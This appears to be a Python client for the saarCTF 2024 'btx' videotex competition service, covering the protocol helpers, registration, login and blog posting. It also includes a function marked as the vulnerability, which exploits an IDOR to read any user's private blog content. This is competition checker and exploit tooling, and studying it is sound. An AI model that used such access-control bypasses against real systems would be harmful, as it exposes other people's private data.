"""Raw-socket protocol client for btx (saarCTF 2024 Bildschirmtext / videotex).

The service is `python3 neu-ulm.py` run once per connection behind the inetd
wrapper. It speaks the CEPT videotex protocol — a *binary/escape* terminal
stream, not lines of text. Input "keys" are control bytes: F1/INITIATOR = 0x13
opens a `*<pageno>#` command, F2/TERMINATOR = 0x1c confirms a field. Output is a
stream of cursor-positioning and colour escapes; pages end with a stable
"end of page" sequence. So every step keys off a known CEPT marker via
`recv_until` rather than parsing whole screens.

The CEPT helpers and the per-page terminal markers (`_PE`) below are ported
verbatim from the upstream saarCTF checker / exploits — they are the proven
fingerprints of each screen.

Flows used by the flag handler / functionality test:
    register      -> create an account (server stores users/<id>-1.user etc.)
    login         -> authenticate an existing account, reach the home screen
    create_blog   -> publish a blog (title / visibility / notes / content)
    read_blog_by_pageno -> the *34<idx><user_id># IDOR: render ANY user's blog
                           title+content by page number, with no auth check
    logout        -> return to the start screen
"""
from __future__ import annotations

import logging

import nclib

log = logging.getLogger(__name__)

PORT = 1983
_TIMEOUT = 8


class ClientError(Exception):
    """Protocol-level failure (unexpected screen / missing marker)."""


# --- CEPT byte helpers (ported from the upstream checker) ------------------

def _set_palette(pal: int) -> bytes:
    return bytes([0x9B, 0x30 + pal, 0x40])


def _fg_simple(c: int) -> bytes:
    return bytes([0x80 + c])


def _bg_simple(c: int) -> bytes:
    return bytes([0x90 + c])


def _fg(c: int) -> bytes:
    return _set_palette(c >> 3) + _fg_simple(c & 7)


def _bg(c: int) -> bytes:
    return _set_palette(c >> 3) + _bg_simple(c & 7)


def _show_cursor() -> bytes:
    return b"\x11"


def _cursor(y: int, x: int) -> bytes:
    return bytes([0x1F, 0x40 + y, 0x40 + x])


def _end_of_page() -> bytes:
    return b"\x1f\x58\x41\x11\x1a"


def _ter() -> bytes:        # F2 — confirm field
    return b"\x1c"


def _ini() -> bytes:        # F1 — start a *<page># command
    return b"\x13"


# Stable terminal markers each screen ends with.
_PE = {
    "login": _fg(3) + _bg(12) + _show_cursor(),
    "logout": _cursor(24, 1) + _show_cursor(),
    "home": _cursor(24, 1) + _show_cursor(),
    "create_user": _fg(3) + _bg(12) + _show_cursor(),
    "blog": _fg(3) + _bg(4) + _show_cursor(),
    "blog_overview": _cursor(24, 1) + _cursor(24, 1) + _show_cursor(),
}


def connect(ip):
    try:
        conn = nclib.Netcat(connect=(ip, PORT), raise_timeout=True)
        conn.settimeout(_TIMEOUT)
        return conn
    except nclib.NetcatError:
        return None


def _recv_until_any(conn, markers) -> bytes:
    """nclib's recv_until takes a single needle; this waits for any of several."""
    buf = bytearray()
    while True:
        b = conn.recv(1)
        if not b:
            return bytes(buf)
        buf += b
        for m in markers:
            if buf.endswith(m):
                return bytes(buf)


def login(conn, participant_number: bytes = b"", password: bytes = b"") -> None:
    """Authenticate (empty participant = guest). Leaves the connection on the
    home/start screen. Raises ClientError on a broken login flow."""
    conn.recv_until(_PE["login"])
    conn.send(participant_number + _ter())
    data = conn.recv_until(_PE["login"])
    if b"Enter extension" not in data:
        raise ClientError("login: extension prompt missing")
    conn.send(_ter())
    conn.recv_until(_PE["login"])
    conn.send(password + _ter())
    data = conn.recv_until(_PE["home"])
    if b"German Federal Postal Service" not in data:
        raise ClientError("login failed (wrong credentials or missing account)")


def register(conn, participant_number: bytes, password: bytes) -> None:
    """Create an account with a server-stored profile + password.

    Starts from a just-connected socket. Idempotent: if the participant number
    is already taken, it returns cleanly (logged in state is the start screen).
    """
    login(conn)                       # guest
    conn.send(b"7")                   # 7 -> register
    conn.recv_until(_PE["create_user"])
    conn.send(participant_number + _ter())
    data = _recv_until_any(conn, [_end_of_page(), _PE["create_user"]])
    if b"Participant no. already assigned" in data:
        conn.send(_ter() + _ini() + b"8" + _ter())
        conn.recv_until(_PE["logout"])
        conn.recv_until(_PE["logout"])
        conn.send(_ter())
        return
    # salutation, last_name, first_name, street, zip, city — each followed by a
    # field redraw that ends on the create_user marker.
    for field in (b"X", b"Last", b"First", b"Street", b"12345", b"City"):
        conn.send(field + _ter())
        conn.recv_until(_PE["create_user"])
    # country code (default "de"): confirm, then SYNC on the password field's
    # redraw before sending the password (skipping this recv desyncs the stream
    # and the password is silently dropped).
    conn.send(_ter())
    conn.recv_until(_PE["create_user"])
    # password: after confirming, the add-user action fires and shows the
    # "User created. Please sign in. -> #" system message and waits for a TER.
    conn.send(password + _ter())
    data = conn.recv_until(_end_of_page())
    if b"User created" not in data:
        raise ClientError("registration did not reach the 'User created' confirmation")
    conn.send(_ter())
    conn.recv_until(_PE["login"])


def create_blog(conn, title: bytes, content: bytes, notes: bytes,
                visibility: bytes = b"false") -> None:
    """Publish a blog from a logged-in home screen.

    `visibility=false` makes it PRIVATE: the legitimate blog-list path won't
    show it to other users — but the *34 page-number read still leaks its
    title+content (that's the vuln). title carries the flag.
    """
    conn.send(_ini() + b"31" + _ter())          # 31 -> compose
    data = conn.recv_until(_PE["blog"])
    if b"Blogging Service" not in data:
        raise ClientError("blog compose page missing")
    conn.send(title + _ter())
    conn.recv_until(_PE["blog"])
    conn.send(visibility + _ter())
    conn.recv_until(_PE["blog"])
    conn.send(notes + _ter())
    conn.recv_until(_PE["blog"])
    conn.send(content + _ter())
    data = conn.recv_until(_end_of_page())
    if b"Publish?" not in data:
        raise ClientError("blog publish confirmation missing")
    conn.send(b"19" + _ter())                    # 19 -> yes
    conn.recv_until(_PE["blog_overview"])


def read_blog_by_pageno(conn, target_user_id: bytes, idx: bytes = b"1") -> bytes:
    """THE VULN. *34<idx><user_id># renders that user's <idx>-th blog
    (title + content) with NO ownership / visibility check. Returns the raw
    CEPT page. Must be called from any logged-in home screen."""
    conn.send(_ini() + b"34" + idx + target_user_id + _ter())
    return conn.recv_until(_end_of_page())


def logout(conn) -> None:
    try:
        conn.send(_ini() + b"8" + _ter())
    except Exception:
        pass
